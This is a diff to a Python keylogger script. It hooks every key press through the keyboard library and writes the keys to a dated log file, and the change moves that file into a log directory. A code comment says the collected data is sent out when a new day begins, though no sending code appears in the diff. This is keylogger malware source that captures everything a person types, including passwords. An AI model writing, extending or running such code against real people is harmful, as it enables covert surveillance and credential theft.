@@ -1,7 +1,8 @@
+import os
 import keyboard
 from functools import partial
 from src.static.auxiliaries import get_actual_date
-from src.static.constants import SPECIAL_KEYS
+from src.static.constants import LOG_DIR, SPECIAL_KEYS
 
 def __log_key(event, filename):
     keyname = event.name
@@ -18,13 +19,14 @@ def listen_keyboard():
     # resume the logging within the same file,
     # and sending all the data when a new day is detected
     ACTUAL_DATE = get_actual_date()
-    filename = f"keylog_{ACTUAL_DATE}.txt"
+    FILE_NAME = f"{ACTUAL_DATE}.txt"
+    LOGGING_PATH = os.path.join(LOG_DIR, FILE_NAME)
     
-    log_key_callback = partial(__log_key, filename=filename)
+    log_key_callback = partial(__log_key, filename=LOGGING_PATH)
     keyboard.on_press(log_key_callback)
     print("Keylogger is running...")
     
     # Keep the script running until 'Esc' is pressed
     keyboard.wait('esc')
 
-    return filename
+    return LOGGING_PATH
